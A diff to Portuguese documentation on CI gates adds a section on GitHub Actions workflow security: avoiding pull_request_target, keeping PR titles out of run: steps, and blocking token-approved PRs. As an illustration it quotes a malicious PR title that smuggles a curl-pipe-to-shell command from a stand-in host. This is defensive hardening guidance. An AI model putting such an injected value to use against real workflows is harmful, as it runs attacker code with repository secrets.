@@ -29,6 +29,16 @@ Decisões que valem copiar (todas comentadas no template):
 | Resumo no `$GITHUB_STEP_SUMMARY` | Quem abre o run entende o contrato do gate sem ler o YAML |
 | Gate separado do pipeline de release | O `build.yml` (release) segue intocado; gate de PR não builda APK |
 
+## O workflow também é superfície de ataque
+
+O gate protege o código — e o próprio workflow precisa de três regras para não virar o vetor:
+
+- **`pull_request`, nunca `pull_request_target`** (em repo que aceita fork). O `_target` roda no contexto do repo-base — **com secrets e permissão de escrita** — sobre código que veio do fork: é o vetor clássico de "pwn request". O template usa `pull_request`; se um dia precisar do `_target` (label de fork, comment bot), nunca combine com checkout do código do fork.
+- **Input não-confiável nunca interpolado em `run:`.** `${{ github.event.pull_request.title }}` é substituição **textual antes do bash** — um título de PR contendo `"; curl evil.sh | sh` vira comando. Título, branch name, corpo de issue: sempre via `env:` (`env: TITLE: ${{ ... }}` e `"$TITLE"` no script). SHAs e números são seguros; strings de usuário nunca.
+- **"Allow GitHub Actions to create and approve pull requests" desligado** (Settings → Actions). Impede que o token de um workflow comprometido aprove PR — a aprovação humana do gate deixa de ser forjável por supply chain de action.
+
+As três custam zero e valem para qualquer plano ([doc 09](09-custos.md)); a primeira e a terceira só mordem quando há forks/equipe, mas custam nada desde o dia 1.
+
 ## CI verde que não prova nada
 
 Antes de bloquear merge, o check precisa **falhar quando o trabalho falha** — e há três jeitos clássicos de perder isso sem perceber (os dois primeiros flagrados num pipeline público de "AI guardrail" examinado em jul/2026, com 31 de 38 runs `success` e `BUILD FAILED` no log; o terceiro num dos três codebases de origem):
